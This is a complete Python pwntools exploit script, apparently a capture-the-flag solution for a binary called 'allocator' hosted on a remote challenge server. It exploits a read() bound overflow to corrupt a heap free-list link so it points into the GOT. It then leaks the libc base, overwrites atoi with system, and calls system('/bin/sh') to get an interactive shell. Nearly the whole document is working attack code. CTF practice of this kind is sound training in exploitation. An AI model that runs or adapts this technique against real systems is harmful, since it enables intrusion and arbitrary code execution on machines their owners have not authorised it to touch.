# template-v2.0 for exploit scripts by fa1c4
# usage: python exp.py [REMOTE|GDB|NULL]
'''
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    vuln: bound overflow in sub_4016EF read() return -1 when failed
exp: overflow to write freed obj link to GOT, then leak libc and hijack GOT
'''
from pwn import *


# define the context
binary_name = './allocator'
libc_name = './libc64.so' if args.REMOTE \
        else '/lib/x86_64-linux-gnu/libc.so.6'
elf = ELF(binary_name, checksec=True) if binary_name else None
libc = ELF(libc_name, checksec=False) if libc_name else None
context.binary = elf
context(arch=elf.arch, os=elf.os)
context.terminal = ['tmux', 'splitw', '-h']

# define the io functions
rc  = lambda *x, **y: io.recv(*x, **y)
rl  = lambda *x, **y: io.recvline(*x, **y)
ru  = lambda *x, **y: io.recvuntil(*x, **y)
sn  = lambda *x, **y: io.send(*x, **y)
sl  = lambda *x, **y: io.sendline(*x, **y)
sa  = lambda *x, **y: io.sendafter(*x, **y)
sla = lambda *x, **y: io.sendlineafter(*x, **y)

# define the io object
if args.REMOTE:
    io = remote('node5.buuoj.cn', 25225)
elif args.GDB:
    io = gdb.debug(binary_name, gdbscript="""
        brva 0x2333
        c
    """, aslr=False)
else:
    io = process(binary_name)


# exploiting code
def gain(idx, size, content):
    sla(b'>> ', b'gain(' + str(idx).encode() + b');')
    sla(b'10100110010111101001011011001110: ', str(size).encode())
    sa(b'00101110011101101010011000101110011101101111011011000110: ', content)

def edit(idx, content):
    sla(b'>> ', b'edit(' + str(idx).encode() + b');')
    sa(b'00101110011101101010011000101110011101101111011011000110: ', content)

def show(idx):
    sla(b'>> ', b'show(' + str(idx).encode() + b');')

def free(idx):
    sla(b'>> ', b'free(' + str(idx).encode() + b');')


atoi_got = elf.got['atoi']
gain(0, 0xe00, cyclic(0xe00)) # 0
gain(1, 0xb0, cyclic(0xb0)) # 1
free(0)
free(1)

gain(4, 0x1e8, p64(0x4043a0) + cyclic(0x1df) + b'\n') # 4
gain(5, 0xb0, cyclic(0xb0))
payload = p64(0x131410e0) + p64(0) * 3 + p64(0x4040b8) + b'\n'
gain(6, 0x131410c0, payload)

show(2)
libc.address = u64(rc(6).ljust(8, b'\x00')) - libc.sym.atoi
system_addr = libc.sym.system
log.info(f'libc base: {hex(libc.address)}')
log.info(f'system addr: {hex(system_addr)}')

edit(2, p64(system_addr) + p64(0xfa1c4233))
# gdb.attach(io)
# pause()

sla(b'>> ', b'show(/bin/sh);') # trigger system('/bin/sh') with atoi('/bin/sh')

# interact with the shell
io.interactive()
